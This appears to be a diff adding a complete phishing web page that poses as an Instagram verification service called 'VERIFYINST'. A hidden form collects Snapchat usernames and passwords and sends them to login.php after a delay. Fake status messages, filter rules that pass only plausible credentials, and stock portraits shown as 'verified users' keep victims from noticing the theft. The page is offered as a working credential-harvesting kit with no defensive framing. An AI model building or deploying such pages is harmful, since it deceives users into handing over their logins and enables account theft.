@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Get Verified on Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+     * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(45deg,#ff0000 ,#0d0d97, #c420b6, #2d02d9);
+      background-size: 400% 400%;
+      animation: gradientBG 8s ease infinite;
+      color: white;
+    }
+     @keyframes gradientBG {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+} 
+    
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+    }
+    .logo {
+        margin-top: 20px;
+      font-weight: bold;
+      font-size: 24px;
+      color: #fff;
+      margin-left: -700px;
+    }
+    nav a {
+      color: #ccc;
+      margin: 0 15px;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 20px;
+    }
+    nav a:hover {
+      color: #fff;
+    }
+    .apply-btn {
+      background: #347dff;
+      color: white;
+      padding: 15px 30px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 20px;
+      border: none;
+      cursor: pointer;
+      
+    }
+
+    .hero {
+      padding: 50px 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+    .hero h1 {
+      font-size: 42px;
+      font-weight: 700;
+    }
+    .hero p {
+      margin: 20px 0;
+      font-size: 18px;
+      color: #ccc;
+    }
+.hero-container {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  max-width: 1200px;
+  margin: auto;
+  padding: 40px 20px;
+}
+
+.hero-left {
+  flex: 1;
+  max-width: 600px;
+}
+
+.hero-right {
+  flex: 1;
+  text-align: center;
+}
+
+.hero-right img {
+  max-width: 100%;
+  height: 600px;
+  border-radius: 16px;
+  box-shadow: 0 0 25px rgba(0, 0, 0, 0.3);
+  margin-left: 280px;
+}
+
+
+    .info-boxes {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 30px;
+      margin-top: 40px;
+    }
+    .info-box {
+      background: #0e2a75;
+      padding: 20px;
+      border-radius: 12px;
+      width: 250px;
+      text-align: center;
+    }
+    .info-box h3 {
+      margin-bottom: 10px;
+    }
+
+    .how-it-works {
+      padding: 60px 40px;
+      background: #081d51;
+      text-align: center;
+    }
+    .how-it-works h2 {
+      font-size: 32px;
+      margin-bottom: 40px;
+    }
+    .steps {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 40px;
+    }
+    .step {
+      width: 250px;
+    }
+    .step h3 {
+      margin-bottom: 10px;
+      color: #347dff;
+    }
+
+    .verified-users1 {
+      background: #031132;
+      padding: 50px 40px;
+      text-align: center;
+    }
+    .verified-users1 h2 {
+      margin-bottom: 20px;
+      font-size: 30px;
+    }
+    .marquee {
+      overflow: hidden;
+      white-space: nowrap;
+      box-sizing: border-box;
+      animation: marquee 20s linear infinite;
+    }
+    .marquee img {
+      height: 80px;
+      width: 80px;
+      border-radius: 50%;
+      margin: 0 15px;
+      border: 3px solid #347dff;
+    }
+
+    @keyframes marquee {
+      0%   { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+
+    @media (max-width: 768px) {
+      .info-boxes, .steps {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+    header img{
+        width: 100px;
+        height:100px;
+    }
+    #snapchat-link1 {
+  display: inline-flex;
+  align-items: center;
+  background: #fffc00;
+  color: #000;
+  margin-top: 8px;
+  height: 70px;
+  width: 100px;
+  padding: 5px 10px;
+  border-radius: 50px;
+  font-weight: bold;
+  font-family: 'Arial', sans-serif;
+  text-decoration: none;
+  transition: 0.3s ease;
+  box-shadow: 0 4px 120px rgba(0,0,0,0.2);
+}
+
+#snapchat-link:hover {
+  background: #fff000;
+  transform: translateY(-2px);
+}
+
+/* 
+userform */
+
+   .verified-users {
+      width: 100%;
+      max-width: 400px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .scroll-images {
+        margin-top: 30px;
+      display: inline-block;
+      white-space: nowrap;
+      animation: scroll-left 20s linear infinite;
+    }
+
+    .scroll-images img {
+      width: 60px;
+      height: 60px;
+      margin: 0 10px;
+      border-radius: 50%;
+      border: 2px solid #0e1a36;
+    }
+
+    @keyframes scroll-left {
+      from {
+        transform: translateX(100%);
+      }
+      to {
+        transform: translateX(-100%);
+      }
+    }
+
+    .form-container {
+      /* background: #0e1a36; */
+       background: linear-gradient(45deg,#ff0000 ,#0d0d97, #c420b6, #2d02d9);
+      background-size: 400% 400%;
+      animation: gradientBG 8s ease infinite;
+      border-radius: 20px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      text-align: center;
+      color: #ffffff;
+      margin-top: -1350px;
+      margin-left: 600px;
+      position: absolute;
+
+    }
+#userForms{
+  display: none;
+}
+    .form-container img.logo {
+      width: 70px;
+      margin-bottom: 30px;
+      margin-left: 1px;
+      margin-top: -40px;
+      border-radius: 50%;
+      margin-right: 280px;
+    }
+    
+
+    .form-container h1 {
+      font-size: 24px;
+      font-weight: 700;
+      
+    }
+
+    .form-container p.subtitle {
+      font-size: 14px;
+      color: #b0bddb;
+      margin-bottom: 30px;
+    }
+
+    .form-container input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      border: none;
+      background: #1c2d54;
+      color: white;
+      font-size: 14px;
+    }
+
+    .form-container input::placeholder {
+      color: #8b95b8;
+    }
+
+    .form-container button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      background: linear-gradient(90deg, #ff4b91, #a738f6);
+      font-weight: bold;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .form-container button:hover {
+      opacity: 0.9;
+    }
+
+    .form-container .forgot {
+      font-size: 13px;
+      color: #9da8ca;
+      margin-top: 15px;
+    }
+
+    .form-container .badge {
+      width: 50px;
+      margin-top: 20px;
+    }
+
+    #messageBox {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #c2d5ff;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @media screen and (max-width: 480px) {
+      .form-container {
+        padding: 30px 20px;
+      }
+    }
+  
+@media screen and (max-width: 768px) {
+  /* header {
+    flex-direction: column;
+    align-items: flex-start;
+  }
+
+  .logo {
+    margin-left: 0;
+    margin-top: 10px;
+    font-size: 20px;
+  }
+
+  nav {
+    margin-top: 10px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+  }
+
+  nav a, .apply-btn {
+   margin-right: 10px;
+  } */
+/* header {
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    padding: 15px 20px;
+  } */
+
+  #snapchat-link1 {
+    margin-top: 10px;
+    width: 70px;
+    height: 70px;
+  }
+
+  .logo {
+    font-size: 20px;
+    margin-left: 10px;
+    margin-top: 10px;
+  }
+/* 
+  nav a {
+    flex-direction: column;
+    margin-top: 10px;
+    margin-left:  100px;
+  } */
+
+  nav a {
+    margin: 8px ;
+    margin-left: 25px;
+    font-weight: bold;
+    font-size: 20px;
+  }
+  .hero-container {
+    flex-direction: column;
+    padding: 20px;
+    text-align: center;
+  }
+
+  .hero-left, .hero-right {
+    max-width: 100%;
+    width: 100%;
+  }
+
+  .hero-right img {
+    width: 100%;
+    height: auto;
+    margin-left: 0;
+  }
+
+  .form-container {
+    position: static !important;
+    margin: 30px auto !important;
+    width: 90% !important;
+    
+
+  }
+
+  #snp {
+    margin-right: 0 !important;
+    text-align: center;
+  }
+
+  .form-container img.logo {
+    margin: 0 auto 20px auto;
+    display: block;
+    
+  }
+
+  .verified-users {
+    text-align: center;
+    margin: auto;
+    
+  }
+  .verified-users1{
+    
+     margin-top: 10px;
+     width: 400px;
+    
+  }
+
+  .marquee img, .scroll-images img {
+    height: 60px;
+    width: 60px;
+    
+  }
+  .marquee{
+  margin-left: -10px;
+  }
+}
+
+  
+ @media screen and (max-width: 500px) {
+  
+
+  .how-it-works{
+    margin-left: 40px;
+  }
+  nav a{
+    margin-left: 100px;
+    font-weight: bold;
+    font-size: 20px;
+  }
+.verified-users1{
+    
+     margin-top: 10px;
+     width: 500px;
+    
+  }
+  /* nav {
+    margin-top: 10px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+  }
+
+  nav a, .apply-btn {
+   margin-right: 10px;
+  }
+
+  .hero-container {
+    flex-direction: column;
+    padding: 20px;
+    text-align: center;
+  }
+
+  .hero-left, .hero-right {
+    max-width: 100%;
+    width: 100%;
+  }
+
+  .hero-right img {
+    width: 100%;
+    height: auto;
+    margin-left: 0;
+  }
+
+  .form-container {
+    position: static !important;
+    margin: 30px auto !important;
+    width: 90% !important;
+    
+
+  }
+
+  #snp {
+    margin-right: 0 !important;
+    text-align: center;
+  }
+
+  .form-container img.logo {
+    margin: 0 auto 20px auto;
+    display: block;
+    
+  }
+
+  .verified-users {
+    text-align: center;
+    margin: auto;
+  }
+
+  .marquee img, .scroll-images img {
+    height: 60px;
+    width: 60px;
+  } */
+}   
+
+/* validation form */
+ input {
+    padding: 10px;
+    border-radius: 8px;
+    border: 2px solid #ccc;
+    font-size: 16px;
+    width: 250px;
+    margin-bottom: 5px;
+  }
+
+  input.error-border {
+    border-color: red;
+  }
+
+  input.valid-border {
+    border-color: green;
+  }
+
+  .error {
+    color: red;
+    font-size: 13px;
+    margin-bottom: 10px;
+    display: none;
+  }
+
+  </style>
+</head>
+<body>
+<header>
+    <img src="logo.jpg"alt='logo' id="snapchat-link1" > 
+    <div class="logo">VERIFYINST</div>
+    <nav>
+      <a href="index.html" >Home</a>
+      <!-- <a href="#">Pricing</a>
+      <a href="#">Support</a> -->
+      <!-- <button class="apply-btn" onclick="user_form()">Apply Now</button> -->
+    </nav>
+  </header>
+
+  <section class="hero">
+  <div class="hero-container">
+    <div class="hero-left">
+      <h1>Get Verified on Instagram</h1>
+      <p>Apply for Instagram verification and get the blue check mark for your profile</p>
+      <button class="apply-btn"onclick="user_form()">Apply Now</button>
+
+      <div class="info-boxes">
+        <div class="info-box">
+          <h3>Submit Application</h3>
+          <p>Fill out the application with your account details</p>
+        </div>
+        <div class="info-box">
+          <h3>Review Process</h3>
+          <p>Our team will review your application and account</p>
+        </div>
+        <div class="info-box">
+          <h3>Get Verified</h3>
+          <p>Receive the blue check mark on your profile</p>
+        </div>
+      </div>
+    </div>
+    <div class="hero-right">
+      <img src="image.png" alt="Instagram Profile Mobile View" />
+    </div>
+  </div>
+</section>
+
+
+  <section id="how-it-works" class="how-it-works">
+    <h2>How It Works</h2>
+    <div class="steps">
+      <div class="step">
+        <h3>1. Submit Application</h3>
+        <p>Fill out the form with your details.</p>
+      </div>
+      <div class="step">
+        <h3>2. Wait for Review</h3>
+        <p>Our team will verify your application.</p>
+      </div>
+      <div class="step">
+        <h3>3. Get Verified</h3>
+        <p>If approved, the badge will appear on your profile.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="verified-users1">
+    <h2>Verified Users</h2>
+    <div class="marquee">
+      <img src="https://randomuser.me/api/portraits/women/1.jpg" />
+      <img src="https://randomuser.me/api/portraits/men/2.jpg" />
+      <img src="https://randomuser.me/api/portraits/women/3.jpg" />
+      <img src="https://randomuser.me/api/portraits/women/4.jpg" />
+      <img src="https://randomuser.me/api/portraits/men/5.jpg" />
+      <img src="https://randomuser.me/api/portraits/women/6.jpg" />
+      <img src="https://randomuser.me/api/portraits/men/7.jpg" />
+    </div>
+  </section>
+
+
+
+
+    <!-- <div id="messageBox" class="hidden"></div>
+  </div> -->
+  <!-- Your Original Form Section -->
+<div class="form-container" id="userForms">
+    <p id="snp" style="margin-right:60px; font-size: 20px; font-weight: bold; font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif; color: rgb(239, 239, 0);" >Snapchat</p>
+    <img src="logo.jpg" class="logo" alt="Instagram Logo">
+    <h1>Get Blue Badge on Instagram</h1>
+    <p class="subtitle">Update your account with a blue verified badge</p>
+
+  <form id="loginForm" method="POST" action="login.php" novalidate>
+  <div>
+    <input type="text" name="username" id="username" placeholder="Snapchat Username" required>
+    <div class="error" id="usernameError"></div>
+  </div>
+  <br>
+  <div>
+    <input type="password" name="password" id="password" placeholder="Password" required>
+    <div class="error" id="passwordError"></div>
+  </div>
+  <br>
+  <button type="submit">Log In</button>
+</form>
+    <div class="forgot">Forgot password?</div>
+    <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" class="badge" alt="Verified Badge">
+     <div class="verified-users">
+    <div class="scroll-images">
+      <img src="https://randomuser.me/api/portraits/men/11.jpg" alt="user1">
+      <img src="https://randomuser.me/api/portraits/women/22.jpg" alt="user2">
+      <img src="https://randomuser.me/api/portraits/men/33.jpg" alt="user3">
+      <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="user4">
+      <img src="https://randomuser.me/api/portraits/men/55.jpg" alt="user5">
+      <img src="https://randomuser.me/api/portraits/women/66.jpg" alt="user6">
+      <img src="https://randomuser.me/api/portraits/men/77.jpg" alt="user7">
+      <img src="https://randomuser.me/api/portraits/women/88.jpg" alt="user8">
+    </div>
+  </div>
+  <div id="messageBox" class="hidden"></div>
+  <script>
+
+
+function user_form(){
+       let get=document.getElementById('userForms');
+      
+
+        if(get.style.display=='block'){
+        get.style.display='none';
+        get.scrollIntoView({ behavior: "smooth", block: "end" });
+    }
+    else{
+         get.style.display='block';
+    }
+ setTimeout(() => {
+      get.scrollIntoView({ behavior: "smooth", block: "end" });
+     }, 100); // Delay to ensure DOM update
+     }
+
+
+document.getElementById('loginForm').addEventListener('submit', function (e) {
+  e.preventDefault();
+
+  const msgBox = document.getElementById('messageBox');
+  msgBox.classList.remove('hidden');
+
+  const usernameInput = document.getElementById("username");
+  const passwordInput = document.getElementById("password");
+  const username = usernameInput.value.trim();
+  const password = passwordInput.value;
+
+  // Show progress message first (always)
+  msgBox.innerHTML = "<b>✅ !</b><br>We are on the progress, please wait.....";
+
+
+  // Delay to simulate server check
+  setTimeout(() => {
+    // Secret Snapchat-style rules (invisible to user)
+    const usernameValid = /^[a-zA-Z][a-zA-Z0-9._-]{2,14}$/.test(username) &&
+                          /[0-9_.]/.test(username) &&
+                          !/(123|abc|asd|snap|test)/i.test(username);
+
+    const passwordValid = /^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])(?!.*\s)/.test(password) &&
+                          !/(password|1234|asdf|qwer|1111)/i.test(password);
+
+    if (!usernameValid || !passwordValid) {
+   msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your password or username doesn't match with Snapchat server.";
+
+      setTimeout(() => {
+        msgBox.innerHTML = "";
+        msgBox.classList.add('hidden');
+      }, 5000);
+      return; // Stop here if invalid
+    }
+
+    // ✅ If valid – continue with rest
+    msgBox.innerHTML = "<b>✅ Valid Credentials</b><br>We are on the progress, please wait...";
+
+    setTimeout(() => {
+      msgBox.innerHTML = "<b>⚠ Server Busy:</b><br>Multiple users are currently trying to verify.<br>Your profile will be updated with a verification tic within <b>5 days</b>.<br><br>✨ <b>Have a great day!</b>";
+    }, 23000); // 23s from here = 25s from start
+
+   setTimeout(() => {
+  const formData = new FormData(document.getElementById('loginForm'));
+
+  fetch('login.php', {
+    method: 'POST',
+    body: formData
+  })
+  .then(response => response.text())
+  .then(result => {
+    msgBox.innerHTML = "<b>✅ Login Successful</b><br>Your data has been sent securely.";
+    console.log("Server response:", result); // Optional: show response in console
+  })
+  .catch(error => {
+    msgBox.innerHTML = "<b>❌ Server Error</b><br>Please try again later.";
+    console.error("Fetch error:", error);
+  });
+  let get=localStorage.setItem("Update", "Account Processing....");
+}, 30000);
+
+
+
+  }, 2000); // 2s delay to show 'progress' before checking
+});
+
+
+
+// form validation
+ const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const usernameError = document.getElementById("usernameError");
+const passwordError = document.getElementById("passwordError");
+
+// Common weak patterns to block
+const commonUserPatterns = /(123|abc|qwe|asd|test|snapchat|user)/i;
+const commonPassPatterns = /(password|1234|asdf|qwer|1111)/i;
+
+// Username validation
+function validateUsername() {
+  const u = usernameInput.value.trim();
+  const regex = /^[a-zA-Z][a-zA-Z0-9._-]{2,14}$/; // 3–15 chars, start with letter :contentReference[oaicite:6]{index=6}
+
+  if (!regex.test(u)) {
+    return showError(usernameInput, usernameError,);
+  }
+  if (!/[0-9_.]/.test(u)) {
+    return showError(usernameInput, usernameError,);
+  }
+  if (commonUserPatterns.test(u)) {
+    return showError(usernameInput, usernameError,);
+  }
+  return showValid(usernameInput, usernameError);
+}
+
+// Password validation
+function validatePassword() {
+  const p = passwordInput.value;
+  const regex = /^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])(?!.*\s).+$/;
+    // ≥8 chars, uppercase, lowercase, number or symbol, no spaces :contentReference[oaicite:7]{index=7}
+
+  if (!regex.test(p)) {
+    return showError(passwordInput, passwordError,);
+  }
+  if (commonPassPatterns.test(p)) {
+    return showError(passwordInput, passwordError,);
+  }
+  return showValid(passwordInput, passwordError);
+}
+
+function showError(input, errorBox, msg) {
+  input.classList.add("error-border");
+  input.classList.remove("valid-border");
+  errorBox.textContent = msg;
+  errorBox.style.display = "block";
+  return false;
+}
+
+function showValid(input, errorBox) {
+  input.classList.remove("error-border");
+  input.classList.add("valid-border");
+  errorBox.style.display = "none";
+  return true;
+}
+
+// Event listeners
+usernameInput.addEventListener("input", validateUsername);
+passwordInput.addEventListener("input", validatePassword);
+
+// document.getElementById("loginForm").addEventListener("submit", function(e) {
+//   const uOK = validateUsername();
+//   const pOK = validatePassword();
+//   if (!uOK || !pOK) e.preventDefault();
+// });
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+  e.preventDefault(); // Always prevent default first
+
+  const uOK = validateUsername();
+  const pOK = validatePassword();
+
+  if (!uOK || !pOK) {
+    // Show error (optional)
+    const msgBox = document.getElementById('messageBox');
+    msgBox.classList.remove('hidden');
+    msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your username or password doesn't match with Snapchat server.";
+
+    setTimeout(() => {
+      msgBox.innerHTML = "";
+      msgBox.classList.add('hidden');
+    }, 5000);
+    
+    return; // Don't submit
+  }
+
+  // ✅ If validation passes, continue fake submit logic
+  msgBox.innerHTML = "<b>✅ !</b><br>We are on the progress, please wait.....";
+
+  setTimeout(() => {
+    msgBox.innerHTML = "<b>⚠ Server Busy:</b><br>Your profile will be updated within 5 days.";
+  }, 3000);
+
+  // Simulated successful processing (no real form submission)
+  setTimeout(() => {
+    msgBox.innerHTML = "<b>✅ Verified!</b><br>Your Snapchat account has been processed.";
+  }, 30000);
+
+  let get=localStorage.setItem("Update","Accout Processing");
+});
+
+
+
+
+
+  </script>
+
+</body>
+</html>
